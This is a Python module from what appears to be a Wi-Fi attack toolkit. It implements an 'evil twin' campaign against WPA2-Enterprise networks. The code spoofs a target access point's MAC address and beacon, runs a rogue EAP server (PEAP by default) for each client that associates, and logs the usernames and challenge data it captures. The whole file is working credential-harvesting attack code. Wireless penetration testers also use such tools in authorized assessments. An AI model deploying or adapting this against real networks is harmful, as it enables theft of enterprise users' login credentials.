from __future__ import annotations

import asyncio
import logging
import struct

from wifit3.campaigns.campaign import Campaign
from wifit3.campaigns.eviltwin_enterprise.eap_server import Capture, EapServer, Method
from wifit3.campaigns.eviltwin_enterprise.enterprise_ap import EnterpriseFakeAP
from wifit3.chips.driver import FakeMacSupport
from wifit3.dot11 import str_to_mac
from wifit3.dot11.eapol import EAPOL_TYPE_EAP, LLC_SNAP_EAPOL, data_header
from wifit3.dot11.mac import mac_to_str
from wifit3.dot11.rsn import ENTERPRISE_AKM_SUITES
from wifit3.models import AccessPoint

logger = logging.getLogger(__name__)

_EAPOL_VERSION = 2
_EAPOL_START = 1
_POLL_SEC = 0.1


def spoofable(iface) -> bool:
    return getattr(getattr(iface, "driver", None), "FAKE_MAC", None) is FakeMacSupport.SPOOFABLE


def _host_iface(array, channel: int):
    if array is None:
        return None
    preferred = array.select_iface(channel)
    if spoofable(preferred):
        return preferred
    return next(
        (iface for iface in array.members
         if spoofable(iface) and channel in iface.supported_channels),
        None,
    )


class EvilTwinEnterpriseCampaign(Campaign):
    button_id = "btn-eviltwin-enterprise"
    key = "eviltwin_enterprise"
    idle_label = "Enterprise"
    run_label = "Stop Enterprise"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap: AccessPoint) -> bool:
        return bool(ap.ssid) and bool(set(ap.akm_suites or ()) & ENTERPRISE_AKM_SUITES)

    @classmethod
    def ineligible_reason(cls, ap: AccessPoint) -> str | None:
        if not ap.ssid:
            return "Hidden SSID"
        if not ap.last_beacon_frame:
            return "no beacon captured yet"
        if not (set(ap.akm_suites or ()) & ENTERPRISE_AKM_SUITES):
            return "Needs an Enterprise network"
        return None

    def status_under_card(self) -> str:
        return "● Enterprise"

    def status_headlines(self, vault) -> list[str]:
        lines = ["[bold cyan]Enterprise AP active[/bold cyan]"]
        if self.captured:
            lines.append(f"[green]Captured {self.captured.username}[/green]")
        lines.append(f"[dim]clients: {len(self._clients)} · captures: {self.capture_count}[/dim]")
        return lines

    def __init__(self, array, target: AccessPoint, method: Method = Method.PEAP):
        super().__init__(ap=target, array=array)
        self.ssid = target.ssid
        self.method = method
        self._clients: dict[str, EapServer] = {}
        self._captured_macs: set[str] = set()
        self.captured: Capture | None = None
        self.capture_count = 0
        self._seq = 0
        self._own_mac: str | None = None
        self.enterprise_ap: EnterpriseFakeAP | None = None

    async def _loop(self) -> None:
        iface = _host_iface(self.array, self.ap.channel)
        if iface is None:
            raise RuntimeError("Interface cannot spoof MAC address")
        self._iface = iface
        if not self.ap.last_beacon_frame:
            raise RuntimeError("No beacon")
        self._own_mac = self.array.register_own_mac(self.ap.bssid)
        self.enterprise_ap = EnterpriseFakeAP(
            iface=iface,
            bssid=str_to_mac(self.ap.bssid),
            ssid=self.ssid,
            channel=self.ap.channel,
            beacon=self.ap.last_beacon_frame,
            rx_source=iface,
            on_eapol=self._on_eapol,
        )
        await self.enterprise_ap.start()
        while not self.stopped:
            await asyncio.sleep(_POLL_SEC)

    def _on_eapol(self, frame: bytes, client: bytes) -> None:
        if len(frame) < 4 or self.enterprise_ap is None:
            return
        mac = mac_to_str(client)
        server = self._clients.get(mac)
        if server is None:
            server = EapServer(ssid=self.ssid, method=self.method)
            self._clients[mac] = server
        kind = frame[1]
        if kind == _EAPOL_START:
            self._send(client, server.request_identity())
            return
        if kind != EAPOL_TYPE_EAP:
            return
        length = struct.unpack_from(">H", frame, 2)[0]
        if len(frame) < 4 + length:
            return
        for response in server.process(frame[4:4 + length]):
            self._send(client, response)
        if server.captured and server.captured.challenge and mac not in self._captured_macs:
            self._captured_macs.add(mac)
            server.captured.client_mac = mac
            self.captured = server.captured
            self.capture_count += 1
            logger.info("captured %s from %s", server.captured.username, mac)

    def _send(self, client: bytes, eap: bytes) -> None:
        if self.enterprise_ap is None:
            return
        body = bytes([_EAPOL_VERSION, EAPOL_TYPE_EAP]) + struct.pack(">H", len(eap)) + eap
        header = bytearray(data_header(
            to_ds=False, bssid=self.enterprise_ap.bssid, client=client))
        struct.pack_into("<H", header, 22, (self._seq << 4) & 0xFFFF)
        self._seq = (self._seq + 1) & 0xFFF
        self.enterprise_ap._tx(bytes(header) + LLC_SNAP_EAPOL + body)

    async def teardown(self) -> None:
        if self.enterprise_ap is not None:
            await self.enterprise_ap.stop()
            self.enterprise_ap = None
        if self._own_mac is not None and self.array is not None:
            self.array.unregister_own_mac(self._own_mac)
            self._own_mac = None
        for server in self._clients.values():
            server.cleanup()
        self._clients.clear()
